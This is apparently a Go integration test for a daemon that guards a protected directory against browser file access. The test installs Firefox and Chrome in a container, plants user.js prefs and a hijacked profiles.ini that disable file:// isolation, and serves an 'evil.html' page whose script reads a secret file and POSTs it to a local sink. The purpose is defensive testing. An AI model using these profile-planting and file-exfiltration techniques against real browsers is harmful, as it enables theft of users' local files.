package integrationtests

import (
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/testcontainers/testcontainers-go"
)

const (
	browserFirefox = "/opt/firefox/firefox"
	// Mozilla's firefox is a launcher that execs firefox-bin, the browser.
	browserFirefoxBin = "/opt/firefox/firefox-bin"
	browserChrome     = "/opt/google/chrome/chrome"
	browserSecret     = "/protected/secret.txt"
	browserMarker     = "BROWSER-SECRET-7C21"
	browserSink       = "/tmp/sink.log"
	browserPage       = "/tmp/page/evil.html"
	browserUser       = "tester"
	browserUID        = "1001" // ubuntu:latest has uid 1000 (ubuntu)
)

// browserEvilPage reads browserSecret from a file:// page and posts what it got to the sink, under
// the label its query string names.
const browserEvilPage = `<!doctype html><html><body><script>
const label = location.search.slice(1);
const post = b => fetch('http://127.0.0.1:48751/' + label, {method: 'POST', mode: 'no-cors', body: b});
try { const x = new XMLHttpRequest(); x.open('GET', 'file://` + browserSecret + `', false); x.send();
  post('READ:' + x.responseText); } catch (e) { post('ERR:' + e); }
</script></body></html>`

// browserFileAccessPrefs turn Firefox's file:// isolation off: a page reads any other file.
const browserFileAccessPrefs = `user_pref("security.fileuri.strict_origin_policy", false);
user_pref("privacy.file_unique_origin", false);
user_pref("browser.shell.checkDefaultBrowser", false);
user_pref("browser.aboutwelcome.enabled", false);
user_pref("datareporting.policy.dataSubmissionEnabled", false);
`

// installBrowsers puts Google Chrome (its .deb) and Mozilla's Firefox build in the container, root
// placed, with Xvfb on :99, the sink on 127.0.0.1:48751 and the page; the browsers run as tester.
func (s *IntegrationSuite) installBrowsers(c testcontainers.Container) {
	s.Require().NoError(c.CopyFileToContainer(s.ctx, netTesterAmd64Bin, "/opt/rt/net_tester", 0o755))
	code, out := s.exec(c, []string{"sh", "-c", "export DEBIAN_FRONTEND=noninteractive && " +
		"timeout 300 apt-get update -qq && timeout 600 apt-get install -y -qq --no-install-recommends " +
		"ca-certificates curl xz-utils bzip2 xvfb libx11-xcb1 >/dev/null 2>&1"})
	s.Require().Equalf(0, code, "installing the browser tools: %s", out)
	s.fetchCached(c, "chrome.deb", "https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb")
	s.fetchCached(c, "firefox.tar", "https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US")
	code, out = s.exec(c, []string{"sh", "-c", "export DEBIAN_FRONTEND=noninteractive && " +
		"timeout 600 apt-get install -y -qq /tmp/chrome.deb >/dev/null && " +
		"(apt-get install -y -qq libdbus-glib-1-2 >/dev/null 2>&1 || true) && " +
		"tar --no-same-owner -xf /tmp/firefox.tar -C /opt && " +
		"useradd -m -u " + browserUID + " " + browserUser + " && mkdir -p /tmp/page /protected /etc/app-listener && " +
		"printf '" + browserMarker + "' > " + browserSecret + " && chmod 755 /protected && chmod 644 " + browserSecret +
		" && (setsid nohup Xvfb :99 -screen 0 1280x1024x24 >/tmp/xvfb.log 2>&1 &) && " +
		"(setsid nohup /opt/rt/net_tester http-sink 127.0.0.1:48751 " + browserSink + " >/tmp/sinkd.log 2>&1 &) && " +
		"sleep 2 && " + browserFirefox + " --version && " + browserChrome + " --version 2>&1"})
	s.Require().Equalf(0, code, "installing the browsers: %s", out)
	s.Require().NoError(c.CopyToContainer(s.ctx, []byte(browserEvilPage), browserPage, 0o644))
}

// browserCacheAge: how long a downloaded browser is reused before the latest one is fetched again.
const browserCacheAge = 7 * 24 * time.Hour

// fetchCached puts url's file at /tmp/<name> in the container: from build/test/cache when fetched
// less than browserCacheAge ago, else downloaded there and kept for the next run.
func (s *IntegrationSuite) fetchCached(c testcontainers.Container, name, url string) {
	host := absPath(filepath.Join("../build/test/cache", name))
	if st, err := os.Stat(host); err == nil && time.Since(st.ModTime()) < browserCacheAge {
		s.Require().NoError(c.CopyFileToContainer(s.ctx, host, "/tmp/"+name, 0o644))
		return
	}
	code, out := s.exec(c, []string{"curl", "-fsSL", "-o", "/tmp/" + name, url})
	s.Require().Equalf(0, code, "downloading %s: %s", url, out)
	rc, err := c.CopyFileFromContainer(s.ctx, "/tmp/"+name)
	s.Require().NoError(err)
	defer rc.Close()
	s.Require().NoError(os.MkdirAll(filepath.Dir(host), 0o755))
	tmp := host + ".part"
	f, err := os.Create(tmp)
	s.Require().NoError(err)
	_, err = io.Copy(f, rc)
	s.Require().NoError(errors.Join(err, f.Close()))
	s.Require().NoError(os.Rename(tmp, host))
}

// browse runs a browser as tester on the page with label until the page reports (or 60s pass),
// then stops every browser, and returns the sink's line for label ("" if none).
func (s *IntegrationSuite) browse(c testcontainers.Container, label, env, cmd string) string {
	script := "cd /tmp && (setpriv --reuid=" + browserUID + " --regid=" + browserUID + " --init-groups env HOME=/home/" + browserUser +
		" DISPLAY=:99 " + env + " " + cmd + " 'file://" + browserPage + "?" + label + "' >/tmp/b-" + label +
		".log 2>&1 &) ; for i in $(seq 120); do grep -q '^/" + label + " ' " + browserSink +
		" 2>/dev/null && break; sleep 0.5; done; pkill -u " + browserUser + " -f /opt/ 2>/dev/null; sleep 2; " +
		"pkill -9 -u " + browserUser + " -f /opt/ 2>/dev/null; sleep 1; grep '^/" + label + " ' " + browserSink + " || true"
	_, out := s.exec(c, []string{"sh", "-c", script})
	return strings.TrimSpace(out)
}

// asTester runs a shell command as tester.
func (s *IntegrationSuite) asTester(c testcontainers.Container, cmd string) string {
	code, out := s.exec(c, []string{"setpriv", "--reuid=" + browserUID, "--regid=" + browserUID, "--init-groups", "env",
		"HOME=/home/" + browserUser, "sh", "-c", cmd + " 2>&1"})
	s.Require().Equalf(0, code, "%s: %s", cmd, out)
	return out
}

// requireBrowserDenied: label's page ran and was refused the secret, and the daemon logged a denial
// of it under one of the marks ops names.
func (s *IntegrationSuite) requireBrowserDenied(c testcontainers.Container, label, got string, ops ...string) {
	s.Require().Truef(strings.HasPrefix(got, "/"+label+" ERR:"), "%s: the page must run and be refused the "+
		"secret, got %q\nbrowser log:\n%s\ndaemon log:\n%s", label, got, s.browserLog(c, label), s.browserDaemonLog(c))
	for line := range strings.SplitSeq(s.readDaemonLog(c), "\n") {
		for _, op := range ops {
			if strings.Contains(line, "op="+op+" ") && strings.Contains(line, "secret.txt") {
				return
			}
		}
	}
	s.Failf("denial not logged", "%s: no op=%v denial of secret.txt in:\n%s", label, ops, s.browserDaemonLog(c))
}

// browserDaemonLog is the daemon log's denials, marks and refusals: the whole log is too long to read.
func (s *IntegrationSuite) browserDaemonLog(c testcontainers.Container) string {
	var keep []string
	for line := range strings.SplitSeq(s.readDaemonLog(c), "\n") {
		for _, k := range []string{"DENIED", "PROFILE", "LAUNCH", "refused", "skipping", "ERROR", "level=error"} {
			if strings.Contains(line, k) {
				keep = append(keep, line)
				break
			}
		}
	}
	return strings.Join(keep, "\n")
}

func (s *IntegrationSuite) browserLog(c testcontainers.Container, label string) string {
	_, out := s.exec(c, []string{"sh", "-c", "tail -20 /tmp/b-" + label + ".log"})
	return out
}

// The real browsers behind TestDaemon_ProfileAnchors and the Chromium file-access launch rules. Each
// attack is first shown to read the secret with no daemon running. Then, whitelisted for /protected:
// Firefox on a planted profile (--profile, or a HOME whose profiles.ini names it) and Chrome on a user
// data dir outside the tree are marked; the same prefs on a profile inside the tree still read it
// (no false positive); Chrome with --allow-file-access-from-files or --disable-web-security is
// refused. Downloads ~300 MB: runs with APPLISTENER_BROWSER_TESTS=1 (make test-integration's default).
func (s *IntegrationSuite) TestDaemon_RealBrowserProfiles() {
	if os.Getenv("APPLISTENER_BROWSER_TESTS") == "" {
		s.T().Skip("set APPLISTENER_BROWSER_TESTS=1 to download and run Firefox and Chrome")
	}
	c := s.startContainer("ubuntu:latest", "linux/amd64", true, amd64Bin)
	defer c.Terminate(s.ctx)
	s.installBrowsers(c)

	const firefox = browserFirefox + " --new-instance --no-remote --profile "
	const chrome = browserChrome + " --no-first-run --no-default-browser-check --no-sandbox --user-data-dir="
	const fileAccess = " --allow-file-access-from-files "
	// An attacker's choice: content processes then read file:// themselves, so a fork server started
	// before the mark would show here as a read.
	const noSandbox = "MOZ_DISABLE_CONTENT_SANDBOX=1"
	planted := func(dir string) {
		s.asTester(c, "mkdir -p "+dir+" && cat > "+dir+"/user.js <<'EOF'\n"+browserFileAccessPrefs+"EOF")
	}
	planted("/tmp/ff-pre")
	planted("/tmp/ff-out")

	// The attacks, with no daemon: each reads the secret.
	for label, run := range map[string][2]string{
		"ff-pre":   {noSandbox, firefox + "/tmp/ff-pre"},
		"ch-flag0": {"", chrome + "/tmp/ch-pre" + fileAccess},
		"ch-dws0":  {"", chrome + "/tmp/ch-pre2 --disable-web-security"},
	} {
		got := s.browse(c, label, run[0], run[1])
		s.Require().Equalf("/"+label+" READ:"+browserMarker, got, "%s: the attack must work without the daemon\n%s",
			label, s.browserLog(c, label))
	}

	// Profiles inside the guarded tree, made before the daemon starts (its only writers are the browsers).
	code, out := s.exec(c, []string{"sh", "-c", "mkdir -p /protected/ff-in /protected/ch-in && " +
		"printf '%s' '" + browserFileAccessPrefs + "' > /protected/ff-in/user.js && chown -R " + browserUID + ":" + browserUID + " " +
		"/protected/ff-in /protected/ch-in 2>&1"})
	s.Require().Equalf(0, code, "inside profiles: %s", out)
	s.startDaemon(c, "[watch /protected]\nneed_encryption: false\n"+browserFirefox+"\n"+browserFirefoxBin+"\n"+browserChrome)

	got := s.browse(c, "ff-in", "", firefox+"/protected/ff-in")
	s.Require().Equalf("/ff-in READ:"+browserMarker, got, "Firefox on a profile inside its tree must keep its "+
		"access\nbrowser log:\n%s\ndaemon log:\n%s", s.browserLog(c, "ff-in"), s.browserDaemonLog(c))
	got = s.browse(c, "ch-in", "", chrome+"/protected/ch-in")
	s.Require().Truef(strings.HasPrefix(got, "/ch-in ERR:"), "Chrome must start on its own profile: %q\n%s",
		got, s.browserLog(c, "ch-in"))
	log := s.readDaemonLog(c)
	s.Require().NotContainsf(log, "PROFILE comm=", "a profile inside the tree marked a browser:\n%s", s.browserDaemonLog(c))
	// Only a whitelisted binary may look inside /protected: that the browsers used their profiles
	// there unhindered shows as no denial of theirs so far.
	for line := range strings.SplitSeq(log, "\n") {
		s.Require().Falsef(strings.Contains(line, "DENIED") && strings.Contains(line, "comm=chrome") ||
			strings.Contains(line, "DENIED") && strings.Contains(line, "comm=firefox"),
			"a browser was refused its own profile: %s", line)
	}

	s.requireBrowserDenied(c, "ff-out", s.browse(c, "ff-out", noSandbox, firefox+"/tmp/ff-out"), "PROFILE")

	// HOME pointing at a planted .mozilla/firefox: no flag at all. A first start writes installs.ini
	// with this build's install hash; both ini files then name the planted profile.
	home := "/tmp/fakehome"
	s.asTester(c, "mkdir -p "+home+"/.mozilla/firefox")
	s.browse(c, "ff-home0", "HOME="+home, browserFirefox+" --new-instance --no-remote")
	hash := strings.TrimSpace(s.asTester(c, "sed -n 's/^\\[\\(.*\\)\\]$/\\1/p' "+home+"/.mozilla/firefox/installs.ini | head -1"))
	s.Require().NotEmptyf(hash, "Firefox wrote no installs.ini under %s", home)
	planted(home + "/.mozilla/firefox/evil.default")
	s.asTester(c, "cd "+home+"/.mozilla/firefox && printf '[Install"+hash+"]\\nDefault=evil.default\\nLocked=1\\n\\n"+
		"[Profile0]\\nName=default\\nIsRelative=1\\nPath=evil.default\\nDefault=1\\n\\n[General]\\n"+
		"StartWithLastProfile=1\\nVersion=2\\n' > profiles.ini && printf '["+hash+"]\\nDefault=evil.default\\n"+
		"Locked=1\\n' > installs.ini")
	s.requireBrowserDenied(c, "ff-home", s.browse(c, "ff-home", "HOME="+home+" "+noSandbox, browserFirefox+" --new-instance --no-remote"),
		"PROFILE")
	s.Require().Containsf(s.asTester(c, "cat "+home+"/.mozilla/firefox/evil.default/prefs.js"),
		"strict_origin_policy", "Firefox did not run on the planted profile")

	// A LAUNCH-marked Chrome is refused its own profile and falls back to ~/.config/google-chrome,
	// whose SingletonLock then marks it PROFILE: either refuses the secret.
	s.requireBrowserDenied(c, "ch-flag", s.browse(c, "ch-flag", "", chrome+"/protected/ch-in"+fileAccess),
		"LAUNCH", "PROFILE")
	s.requireBrowserDenied(c, "ch-dws", s.browse(c, "ch-dws", "", chrome+"/protected/ch-in --disable-web-security"),
		"LAUNCH", "PROFILE")
	s.Require().Containsf(s.readDaemonLog(c), "op=LAUNCH  comm=chrome", "the file access flags must mark Chrome")
	s.browse(c, "ch-out", "", chrome+"/tmp/ch-out")
	log = s.readDaemonLog(c)
	for _, want := range []string{"anchor=/tmp/ff-out/", "anchor=" + home + "/.mozilla/firefox/evil.default/",
		"anchor=/tmp/ch-out/"} {
		s.Require().Containsf(log, want, "daemon log lacks %q:\n%s", want, s.browserDaemonLog(c))
	}

	s.exec(c, []string{"sh", "-c", "pkill -f 'app-listener daemon' || true"})
}
